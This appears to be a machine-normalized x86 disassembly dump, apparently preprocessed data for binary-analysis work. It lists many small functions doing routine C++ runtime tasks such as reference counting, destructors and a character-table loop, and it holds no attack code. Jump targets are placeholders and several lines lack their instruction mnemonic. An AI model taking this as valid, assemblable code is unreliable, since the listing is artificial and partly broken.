lea ebx [ ebp - 0x10 ]
call sub_40dc69
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f803
push 0x8
mov eax sub_44c4fd
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_410487
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4117fe
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f86c
push 0x8
mov eax sub_44c4c1
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_41056c
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_411875
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40f8de
push 0x8
mov eax sub_44d2cd
call sub_4485c8
mov eax [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
call sub_44866d
retn
mov ecx [ ebp + 0x10 ]
call sub_413ee7
add [ ebp + 0x10 ] 0x20
add [ ebp + 0x8 ] 0x20
jmp r-xdata
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
je r-xdata
sub_40f90e
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0x10 ]
jne r-xdata
push 0x1
mov ecx esi
call sub_40487c
add esi 0x20
push 0x0
call sub_426f77
mov eax [ ebp + 0x10 ]
call sub_44866d
retn
sub_40f988
push ebx
push esi
mov esi [ edi + 0x24 ]
push esi
mov eax edi
call sub_40fe85
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
mov bl al
push esi
mov eax edi
call sub_40fe85
pop esi
mov al bl
pop ebx
retn
sub_40fa15
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov eax esi
call sub_411921
add esi 0x4
pop esi
pop ebp
retn
sub_40fa73
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edi ]
mov ebx eax
cmp esi [ edi + 0x10 ]
jne r-xdata
mov eax [ edi + 0x2c ]
mov cl [ esi ]
add eax 0x8
mov [ ebp - 0x4 ] cl
push eax
push [ ebp - 0x4 ]
lea esi [ ebx + 0x10 ]
call sub_411ac6
test al al
jne r-xdata
mov [ edi + 0x1d ] 0x1
mov eax [ ebx + 0x4 ]
mov ebx [ ebx ]
push edi
push eax
push ebx
call sub_413b85
add esp 0xc
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_40fab7
push ebp
mov ebp esp
sub esp 0x24
push esi
mov esi [ ebp + 0x8 ]
push 0x0
call sub_411970
push eax
lea eax [ edi + 0x10 ]
lea esi [ ebp - 0x24 ]
call sub_40d610
mov ecx [ ebp + 0x8 ]
mov eax esi
push eax
push [ ebp + 0xc ]
mov eax edi
call sub_41199c
pop esi
leave
retn 0x8
sub_40fae9
push ebp
mov ebp esp
push edi
lea edi [ esi + 0x18 ]
call sub_40e881
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edi [ esi + 0x10 ]
call sub_40fdc1
mov eax [ ebp + 0xc ]
pop edi
pop ebp
retn 0x8
push 0xa5
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_40fb41
push esi
mov esi [ edx ]
mov edx [ eax ]
imul esi esi 0x18
add esi [ eax + 0x4 ]
push edi
mov edi [ esi + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x10 ] edi
xor al al
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_40fb6a
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edx ]
imul esi esi 0x18
add esi [ eax + 0x4 ]
push edi
mov dl [ esi + 0x8 ]
mov edi [ esi ]
mov ebx [ esi + 0x4 ]
mov [ ebp - 0x1 ] dl
mov edx [ esi + 0x10 ]
mov [ esi ] edx
mov edx [ eax ]
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] 0x1
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov al [ ebp - 0x1 ]
mov [ esi + 0x8 ] al
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
xor al al
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40fc1a
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
je r-xdata
mov [ eax ] ecx
pop ebp
retn
mov dl [ edx ]
inc ecx
cmp ecx [ ebp + 0xc ]
jne r-xdata
cmp [ ecx ] dl
je r-xdata
sub_40fc39
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x1fffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
shl eax 0x3
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_40fc7b
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_40487c
add esi 0x1c
pop esi
pop ebp
retn
sub_40fd17
push 0x4
mov eax sub_44c485
call sub_448595
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
call sub_44866d
retn 0x4
push edi
call sub_404720
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
sub_40fd4f
push 0x8
mov eax sub_44e283
call sub_448595
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call sub_44866d
retn 0x4
lea edx [ ecx + 0x1c ]
push edx
push ecx
push eax
call sub_41205a
sub_40fd7c
push ebp
mov ebp esp
push esi
lea esi [ edi + 0xc ]
call sub_407e47
mov edx [ eax ]
push edi
push [ ebp + 0x8 ]
mov ecx eax
call [ edx + 0x10 ]
pop esi
pop ebp
retn 0x4
sub_40fdc1
push ebx
mov bl [ edi ]
push esi
mov esi eax
call sub_410a44
test al al
je r-xdata
pop esi
pop ebx
retn
lea eax [ esi + 0x8 ]
pop esi
lea edx [ edi + 0x8 ]
pop ebx
jmp sub_4109fa
sub_40fe85
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea esi [ eax + 0x20 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
lea edi [ eax + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax + 0x8 ] ecx
pop esi
leave
retn 0x4
sub_40fec0
push 0x0
mov eax sub_44d2b2
call sub_448595
mov esi [ ebp + 0x8 ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ esi ] r--data
call sub_411b1d
movzx ecx ax
xor eax eax
movzx edx al
mov dx [ edi + edx * 2 ]
and dx cx
xor ebx ebx
cmp bx dx
setne dl
mov [ esi + eax + 0x8 ] dl
inc eax
cmp eax 0x100
jl r-xdata
mov eax esi
call sub_44866d
retn 0x4
sub_40ff11
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ edx + 0xc ]
cmp eax esi
jne r-xdata
push ebx
xor ebx ebx
cmp eax esi
setne bl
push edi
mov edi [ edx + 0x10 ]
sub eax ebx
jmp r-xdata
cmp [ edx + 0x16 ] 0x0
je r-xdata
cmp eax edi
jne r-xdata
mov al 0x1
jmp r-xdata
movzx esi [ eax ]
inc eax
cmp [ esi + ecx + 0x8 ] 0x0
jne r-xdata
xor al al
pop esi
pop ebp
retn 0x4
mov [ edx ] eax
mov al 0x1
jmp r-xdata
pop edi
pop ebx
sub_40ff8e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x2c ]
push edi
xor eax eax
lea edi [ ebp + 0x8 ]
add edx 0x8
cmp [ ecx + 0x8 ] 0x0
stosb [ edi ]
push [ ebp + 0x8 ]
mov eax ecx
je r-xdata
push [ esi + 0x10 ]
lea ebx [ ebp - 0x4 ]
push [ esi ]
call sub_411bbd
push edx
push [ esi + 0x10 ]
lea ebx [ ebp + 0x8 ]
push [ esi ]
call sub_411b7d
jmp r-xdata
mov eax [ eax ]
xor ecx ecx
cmp eax [ esi + 0x10 ]
pop edi
mov [ esi ] eax
pop esi
setne al
pop ebx
leave
retn 0x4
sub_410011
lea eax [ esi + 0x8 ]
call sub_4106f6
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41003e
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_411bfa
pop edi
pop esi
pop ebp
retn 0x4
sub_410060
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor esi esi
lea esi [ edi + 0x8 ]
jmp r-xdata
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
lea esi [ edi + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_410093
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
lea ecx [ ebp + 0xb ]
push ecx
call sub_411c2b
pop edi
pop ebp
retn 0x4
sub_4100f1
lea eax [ esi + 0x8 ]
call sub_410743
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41011e
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x1c ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_411c68
pop edi
pop esi
pop ebp
retn 0x4
sub_410140
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor esi esi
lea esi [ edi + 0x8 ]
jmp r-xdata
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
lea esi [ edi + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_410173
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
lea ecx [ ebp + 0xb ]
push ecx
call sub_411c99
pop edi
pop ebp
retn 0x4
sub_4101d1
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4101fb
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
call sub_411cc3
pop edi
pop esi
pop ebp
retn 0x4
sub_41021d
push ebp
mov ebp esp
push ecx
push esi
lea esi [ ecx + 0xc ]
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
pop esi
leave
retn 0x4
sub_41024a
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
dec [ edi + 0x1c ]
lea esi [ ecx + 0xc ]
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0xc ]
pop edi
pop esi
pop ebp
retn 0x4
sub_4102a9
push esi
push edi
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x18 ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4102db
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x18 ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
call sub_411cf9
pop edi
pop esi
pop ebp
retn 0x4
sub_4102fd
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor eax eax
lea eax [ edi + 0x8 ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
push eax
call sub_411d55
lea esi [ edi + 0x18 ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_410379
push esi
push edi
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x18 ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4103ab
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x18 ]
call sub_407804
mov ecx eax
mov eax [ ebp + 0x8 ]
lea edx [ edi + 0x8 ]
call sub_411d8d
pop edi
pop esi
pop ebp
retn 0x4
sub_4103cd
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
test edi edi
je r-xdata
xor eax eax
lea eax [ edi + 0x8 ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
push eax
call sub_411de8
lea esi [ edi + 0x18 ]
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_410449
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_410468
push ebp
mov ebp esp
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_410487
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4104bf
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0xc ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea esi [ ebx + 0x8 ]
push [ ebp + 0x8 ]
mov edi ecx
call sub_413e54
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4104ef
push ebp
mov ebp esp
push esi
push edi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
lea edi [ ecx + 0xc ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_411e3e
mov esi edi
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41056c
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4105a4
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0xc ]
call sub_407804
push [ ebp + 0x8 ]
lea esi [ edi + 0x8 ]
mov ecx eax
call sub_411e71
pop edi
pop esi
pop ebp
retn 0x4
sub_4105c6
push ebp
mov ebp esp
push esi
push edi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
lea edi [ ecx + 0xc ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_411e9e
mov esi edi
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_410656
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410676
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410696
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4106b6
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4106d6
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_410852
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4106f6
mov edx [ ecx ]
mov [ eax ] edx
test edx edx
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov cl [ ecx + 0x10 ]
mov [ eax + 0x10 ] cl
retn
push esi
xor esi esi
add edx 0x4
inc esi
[ edx ] esi
pop esi
sub_410723
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_410898
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410743
mov edx [ ecx ]
mov [ eax ] edx
test edx edx
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov cl [ ecx + 0x10 ]
mov [ eax + 0x10 ] cl
retn
push esi
xor esi esi
add edx 0x4
inc esi
[ edx ] esi
pop esi
sub_410770
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4108de
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410790
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41090e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4107b0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41093e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4107d0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41096e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410803
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4109b4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_410852
push 0x0
mov eax sub_44b33a
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_410898
push 0x0
mov eax sub_44b30c
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_4108de
push 0x0
mov eax sub_44a5b3
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41090e
push 0x0
mov eax sub_44a590
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41093e
push 0x0
mov eax sub_44a56d
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41096e
push 0x0
mov eax sub_44b2de
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_4109b4
push 0x0
mov eax sub_44b2b0
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_4109fa
push esi
push edi
push 0x3
pop esi
lea ecx [ eax + 0x18 ]
sub edx eax
mov edi [ edx + ecx ]
or [ ecx ] edi
mov edi [ edx + ecx + 0x4 ]
or [ ecx + 0x4 ] edi
sub ecx 0x8
dec esi
jns r-xdata
pop edi
pop esi
retn
sub_410a44
push edi
lea edi [ esi + 0x8 ]
call sub_40e881
pop edi
cmp eax 0x100
jne r-xdata
test eax eax
je r-xdata
xor al al
retn
mov [ esi ] bl
mov al 0x1
retn
cmp [ esi ] bl
je r-xdata
mov eax esi
call sub_408952
jmp r-xdata
sub_410a7c
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410aac
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410af4
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410b24
push 0x2c
mov eax sub_44d28f
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_410c4c
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_410b7f
push 0x2c
mov eax sub_44d26c
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_410c79
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_410bda
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410c0a
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410c4c
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410c79
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_410ca9
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
push edi
test cl 0x3
jne r-xdata
mov edi [ esi + 0xc ]
add edi [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
